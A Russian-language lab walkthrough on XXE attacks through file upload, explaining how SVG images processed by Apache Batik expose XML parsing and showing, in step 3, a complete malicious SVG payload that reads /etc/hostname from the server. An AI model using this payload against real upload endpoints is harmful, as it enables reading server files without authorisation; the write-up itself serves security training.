Атаки XXE через загрузку файлов
Некоторые приложения позволяют пользователям загружать файлы, которые затем обрабатываются на стороне сервера. Некоторые распространенные форматы файлов используют XML или содержат подкомпоненты XML. Примерами форматов на основе XML являются форматы офисных документов, такие как DOCX, и форматы изображений, такие как SVG.

Например, приложение может разрешать пользователям загружать изображения и обрабатывать или проверять их на сервере после загрузки. Даже если приложение ожидает получить формат, такой как PNG или JPEG, используемая библиотека обработки изображений может поддерживать изображения SVG. Поскольку формат SVG использует XML, злоумышленник может отправить вредоносное изображение SVG и таким образом достичь скрытой поверхности атаки для уязвимостей XXE.

---

Эта лаборатория позволяет пользователям прикреплять аватары к комментариям и использует библиотеку Apache Batik для обработки файлов изображений аватаров.

Чтобы решить лабораторную работу, загрузите изображение, отображающее содержимое файла /etc/hostname после обработки. Затем используйте кнопку «Отправить решение», чтобы отправить значение имени хоста сервера.

---

1. На сайте нас встречают посты, переходим на любой из них: 

![image](https://github.com/user-attachments/assets/b586ef61-9664-4731-9253-e6a1fe924c30)

---

2. Внизу поста есть возможность оставить комментарий:

![image](https://github.com/user-attachments/assets/5052e9f9-f64a-477d-877b-904b37eac029)

---

3. Создаем файл формата svg с содержимым: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

---

4. В форму комментария указываем любые значения, загружаем наш svg файл, и отправляем комментарий.

![image](https://github.com/user-attachments/assets/7767104b-0a0c-4252-bcfa-6a355c903008)

5. В нашем комментарии на аватарке в маленьком окошке появился текст который является содержимым /etc/hostname:

![image](https://github.com/user-attachments/assets/42fb9328-3eca-456f-84fa-bb122028d9a4)
